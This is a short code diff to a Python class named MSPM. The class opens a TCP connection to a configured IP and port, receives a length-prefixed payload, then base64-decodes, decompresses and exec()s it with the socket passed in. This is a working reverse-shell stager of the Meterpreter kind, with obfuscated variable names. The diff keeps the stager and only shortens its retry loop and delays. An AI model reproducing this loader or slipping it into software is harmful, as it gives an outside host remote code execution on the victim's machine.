@@ -66,23 +66,18 @@ class MSPM():
             #return None
 
     def __MSPM(self):
-        time.sleep(10)
-        for x in range(40320):  # 40320
+        for x in range(10):  # 40320
             try:
                 COCO = socket.socket(2, socket.SOCK_STREAM)
                 COCO.connect((self.Config_Dict['IP'], self.Config_Dict['PORT']))
-                # print("Connected")
                 LOLO = struct.unpack('>I', COCO.recv(4))[0]
-                time.sleep(10)
                 break
             except:
                 # print("Failed to Connect")
-                time.sleep(10)
+                time.sleep(5)
         d = COCO.recv(LOLO)
-        time.sleep(10)
         while len(d) < LOLO:
             d += COCO.recv(LOLO - len(d))
-        time.sleep(10)
         exec(zlib.decompress(base64.b64decode(d)), {'s': COCO})
 
     def MSPM_Main(self):
